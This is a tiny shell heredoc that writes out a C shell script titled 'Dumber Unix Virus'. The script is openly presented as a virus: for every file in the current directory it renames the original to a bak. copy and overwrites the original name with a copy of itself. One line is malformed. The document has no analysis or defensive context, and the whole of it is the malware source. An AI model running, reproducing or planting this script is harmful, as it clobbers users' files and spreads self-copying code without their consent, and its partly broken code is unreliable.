cat << _EOF >unix.virus


#!/bin/csh
# Dumber Unix Virus
#  by
#     SumUtherGuy
foreach i (*)
mv $i bak.$i
cp $0 $i
i >> $i

end
_EOF
